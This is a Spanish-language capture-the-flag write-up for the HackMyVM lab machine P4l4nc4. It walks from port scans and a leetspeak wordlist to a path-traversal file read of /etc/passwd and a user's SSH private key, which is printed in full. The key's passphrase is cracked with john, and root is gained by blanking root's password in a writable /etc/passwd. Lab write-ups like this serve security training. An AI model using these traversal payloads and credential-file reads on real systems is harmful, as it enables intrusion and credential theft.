---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# P4l4nc4 HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-30 03:23 EDT
Nmap scan report for 192.168.5.31
Host is up (0.0025s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 21:a5:80:4d:e9:b6:f0:db:71:4d:30:a0:69:3a:c5:0e (ECDSA)
|_  256 40:90:68:70:66:eb:f2:6c:f4:ca:f5:be:36:82:d0:72 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:42:BC:8C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.14 seconds
```

Veremos que hay un puerto `80` en el que al parecer se aloja una pagina web, vamos a probar a entrar en dicho puerto `80` a ver que nos encontramos.

Si entramos vemos que hay una pagina echa por defecto de `apache2`, por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.31/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/robots.txt           (Status: 200) [Size: 1432]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos que hay un `robots.txt` a ver que nos encontramos dentro de dicho archivo.

```
URL = http://<IP>/robots.txt
```

Info:

```
A palanca-negra-gigante ÃƒÂ© uma subespÃƒÂ©cie de palanca-negra. De todas as subespÃƒÂ©cies, esta destaca-se pelo grande tamanho, sendo um dos ungulados africanos mais raros. Esta subespÃƒÂ©cie ÃƒÂ© endÃƒÂ©mica de Angola, apenas existindo em dois locais, o Parque Nacional de Cangandala e a Reserva Natural Integral de Luando. Em 2002, apÃƒÂ³s a Guerra Civil Angolana, pouco se conhecia sobre a sobrevivÃƒÂªncia de mÃƒÂºltiplas espÃƒÂ©cies em Angola e, de facto, receava-se que a Palanca Negra Gigante tivesse desaparecido. Em janeiro de 2004, um grupo do Centro de Estudos e InvestigaÃƒÂ§ÃƒÂ£o CientÃƒÂ­fica da Universidade CatÃƒÂ³lica de Angola, liderado pelo Dr. Pedro vaz Pinto, obteve as primeiras evidÃƒÂªncias fotogrÃƒÂ¡ficas do ÃƒÂºnico rebanho que restava no Parque Nacional de Cangandala, ao sul de Malanje, confirmando-se assim a persistÃƒÂªncia da populaÃƒÂ§ÃƒÂ£o apÃƒÂ³s um duro perÃƒÂ­odo de guerra.
Atualmente, a Palanca Negra Gigante ÃƒÂ© considerada como o sÃƒÂ­mbolo nacional de Angola, sendo motivo de orgulho para o povo angolano. Como prova disso, a seleÃƒÂ§ÃƒÂ£o de futebol angolana ÃƒÂ© denominada de palancas-negras e a companhia aÃƒÂ©rea angolana, TAAG, tem este antÃƒÂ­lope como sÃƒÂ­mbolo. Palanca ÃƒÂ© tambÃƒÂ©m o nome de uma das subdivisÃƒÂµes da cidade de Luanda, capital de Angola. Na mitologia africana, assim como outros antÃƒÂ­lopes, eles simbolizam vivacidade, velocidade, beleza e nitidez visual
```

Veremos muchimos texto el cual no nos interesa parcticamente para nada, pero lo que si podemos hacer es probar a generar un diccionario de palabras con dicho texto de esta forma:

```
cewl http://<IP>/robots.txt -w dic.txt
```

Si intentamos utilizar dicho diccionario para tirar un ataque de fuerza bruta web no veremos nada interesante, por lo que vamos a montarnos un script para sustituir las vocales por numeros a lo que corresponden y despues volver todo minuscula de la siguiente forma:

## Escalate user p4l4nc4

> generate\_dic.sh

```bash
#!/bin/bash

# Verifica si se proporcionó un archivo
if [ -z "$1" ]; then
    echo "Uso: $0 archivo.txt"
    exit 1
fi

input="$1"
output="converted_${input}"

# Procesamiento línea por línea
while IFS= read -r line; do
    echo "$line" | \
    tr '[:upper:]' '[:lower:]' | \
    sed -e 's/a/4/g' -e 's/e/3/g' -e 's/i/1/g' -e 's/o/0/g' -e 's/u/9/g' -e 's/l/1/g'
done < "$input" > "$output"

echo "[+] Diccionario generado en: $output"
```

Ahora lo utilizaremos de esta forma:

```shell
bash generate_dic.sh dic.txt
```

Info:

```
[+] Diccionario generado en: converted_dic.txt
```

Ahora vamos a realizar `fuzzing` con dicho diccionario de esta forma.

```shell
gobuster dir -u http://<IP>/ -w converted_dic.txt -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.31/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                converted_dic.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/n3gr4                (Status: 200) [Size: 4]
/n3gr4                (Status: 200) [Size: 4]
Progress: 512 / 516 (99.22%)
===============================================================
Finished
===============================================================
```

Veremos que hemos conseguido encontrar un directorio web bastante interesante, vamos a realizar `fuzzing` dentro del mismo con el mismo diccionario.

```shell
gobuster dir -u http://<IP>/n3gr4 -w converted_dic.txt -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.31/n3gr4
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                converted_dic.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/m414nj3.php          (Status: 500) [Size: 0]
Progress: 512 / 516 (99.22%)
===============================================================
Finished
===============================================================
```

Veremos que hemos encontrado un `.php` pero el cual nos da un `500` de error, por lo que vamos a realizar un poco de `fuzzing` para intentar ver si tuviera alguna vulnerabilidad de poder leer archivos del sistema `LFI`.

### FFUF

```shell
ffuf -u 'http://<IP>/n3gr4/m414nj3.php?FUZZ=../../../../../../../etc/passwd' -w <WORDLIST> -fs 0
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.5.31/n3gr4/m414nj3.php?FUZZ=../../../../../../../etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

page                    [Status: 200, Size: 1066, Words: 5, Lines: 23, Duration: 19ms]
:: Progress: [20469/20469] :: Job [1/1] :: 666 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

Veremos que efectivamente a funcionado, por lo que vamos a probarlo con un `curl` a ver que nos muestra.

```shell
curl 'http://<IP>/n3gr4/m414nj3.php?page=../../../../../../../etc/passwd'
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
p4l4nc4:x:1000:1000:p4l4nc4,,,:/home/p4l4nc4:/bin/bash
```

Veremos que funciona, por lo que ahora vamos a probar a intentar visualizar la clave `PEM` del usuario `p4l4nc4` a ver si lo conseguimos.

```shell
curl 'http://<IP>/n3gr4/m414nj3.php?page=../../../../../../../home/p4l4nc4/.ssh/id_rsa'
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCvTRnNli
2HLc7wYB9S1mbCAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCrXZ98DYMr
n/f74/g82lqDkMHkyocXGXn8VaP/N7vD9j5mLSr1uhKGBbxcVm4uGP9k//mmRKlewRl/MZ
nTg0N8MP9vp0O2B9vrwHLz9JekTblv93/VCDpJS78CGkNNOVMRcv2ZB3w7uFm6zxRZxQmH
5HaRNuf795GQSFjybiqmN7Mu78bG/94aQMZZLALYmoyMCYWXGvvHpxRN1dwNsT7If4aNBE
l1HXVrZY1biDOrpJQ7O+eZpD4IKs5/QgKL6w9nBczVcGKkvyms98A5qTa/F43+1CxQE2ng
wPiejJEeJZ0PEkQu3nZTK1k7WpJzVnhpqbHGlwKWbfvMKh27Y2gpAAADwI6Nr+vLoXaEJy
SIRrVjIYFz/C3B17pmpx+lmupFfU6ruVHLE92gweyr9wAd5lxhKX1I6BClhlEoDWkzEBCT
H/4zg2tj84+hzhdVWUy6KaCVbRbuvJYWQNWY4kgfk/3FTnSJFHd+k8CZImN3Xa/9DRVLmg
jytzseFr83bPyOyGSze51kJX4r2ljurDvmcnXfQ4j27zUUmwEKi02VvjLngXbmMnIMDLI3
x/pdFxnyZ0w6wnl/Bg+2gvc54Y2ssMblNMw6HZU4K2TN/c3li3A3hLZsN7QwNIV76X5UeP
dWCOngRsImAmMtyxPKZ0rvYwgDimWunQPy0yJXEPdofL6hrAxFZ6y+jnm+gM7x1fnooSkb
9H5RblfwiOtuTD7bmAu6ApNU0Ul3X2YFPnDLFjo/D0Sj5LcsYDQ+XlTNUwnjHpyMy5VzUz
2vDpiscBd7FpFCHf1lS9bfGMLbhOfdM6TPzpjlOmdRizoVjGCZdXsA4Jg05FpvEFa3KHqM
iJOA9yXhHPROYmOwl5Mu+NTPc+Xbiu7B8TJu/BORoOShhbm7+kQpXM7XHPDKTTnJo+qmsI
Pt9FuQF3wZWIXZ48DmRKJKhB+a9LwuE8ES3wUTVqx/EbAs08V6/uiBYZmorJFSgbPd68AE
xKTK9ObilJKSfS2Ik5/iVIBTUxlAt2foAUpWTlXVNmFfBEhRSk48E8NhcgNqctKWpjKf0R
2gi/Dvpect4LoqKPue5zvN0dNlYSiq/6QK6NqJrJdN7DvsvocL+BcWmmv31erlJOo6A3Zw
CEpmnqVzMTroZSBQv3eEsOFS/+RkJ5ffFRpXGfWPh4Dn/Y++n3wbHNNb97pOd9WV+IlhDV
7btvga8cG9xp3zihOIf308VowcpIp0CSlEqZDBpis5jWY9J3N1+uh3pJHFgqmLxKnqLmzu
u15Kh/+nAV6DTBVxrdhq8HoLAvb7ubAq2ICHALC39X12+J0cLOUMi8UWYawMTFgYnO3ZBD
fb6fZaM9Hr97jREiUEG6vgIcNgn6jtJ3EM3ncxTKe2T8SSYn8pFy9Lqf+lvZ8yo9DkaPl5
ORSVWa+jCKhuClPZY5t8VJC9xXGyz8Wah15Y2pg95nGEub7dgmRlQAIiSxjWsDmaDzIBPo
IkZ5lzxoTvvtL2N1+4ZFprPwUN6y6C6zrXbzQp7Ov0bZc2g9fFiNxu1HvR96rwVNFHbeia
OJEM2NZSUU52PExgYtSXwO5aDy70oKiu0pbifoYOm19hlYwYWOOa6s+oW2FG+aXO8WIeEa
muaZDiXw==
-----END OPENSSH PRIVATE KEY-----
```

Veremos que funciona, por lo que vamos a conectarnos mediante la clave `PEM` por `SSH`.

### SSH

> id\_rsa

```
<CONTENIDO_DEL_ID_RSA>
```

```shell
chmod 600 id_rsa
```

Ahora nos conectamos por `SSH` una vez echo todo lo anterior.

```shell
ssh -i id_rsa p4l4nc4@<IP>
```

Pero veremos que nos pedira una contraseña, vamos a probar a intentar `crackear` dicha contraseña de esta forma.

```shell
ssh2john id_rsa > hash.ssh | john --wordlist=<WORDLIST> hash.ssh
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
friendster       (id_rsa)     
1g 0:00:00:14 DONE (2025-05-30 03:56) 0.06752g/s 43.21p/s 43.21c/s 43.21C/s mariah..pebbles
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, por lo que vamos a probarla.

```shell
ssh -i id_rsa p4l4nc4@<IP>
```

Metemos como contraseña `friendster` y veremos que estaremos dentro.

Info:

```
p4l4nc4@192.168.5.31's password: 
Linux 4ng014 6.1.0-27-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.115-1 (2024-11-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Nov 13 17:10:08 2024 from 192.168.1.78
p4l4nc4@4ng014:~$ whoami
p4l4nc4
```

Vamos a leer la `flag` del usuario.

> user.txt

```
HMV{6cfb952777b95ded50a5be3a4ee9417af7e6dcd1}
```

## Escalate Privileges

Si vemos los archivos en los cuales podemos escribir podremos ver lo siguiente:

```shell
find / \( -path /proc -o -path /sys \) -prune -o -type f -writable -print 2>/dev/null
```

Info:

```
/etc/passwd
/home/p4l4nc4/user.txt
/home/p4l4nc4/.bash_history
/home/p4l4nc4/.profile
/home/p4l4nc4/.ssh/id_rsa
/home/p4l4nc4/.ssh/id_rsa.pub
/home/p4l4nc4/.sudo_as_admin_successful
/home/p4l4nc4/.bashrc
/home/p4l4nc4/.bash_logout
```

Vemos que entre ellos esta el `/etc/passwd` por lo que vamos a realizar lo siguiente.

```shell
nano /etc/passwd

#Dentro del nano
root:x:0:0:root:/root:/bin/bash # Cambiaremos esta linea
root::0:0:root:/root:/bin/bash # Por esta de aqui quitandole simplemente la "x" a root
```

Lo guardamos y ahora para ser `root` realizaremos lo siguiente.

```shell
su root
```

Info:

```
root@4ng014:/home/p4l4nc4# whoami
root
```

Veremos que ha funcionado, por lo que leeremos la `flag` de `root`.

> root.txt

```
HMV{4c3b9d0468240fbd4a9148c8559600fe2f9ad727}
```
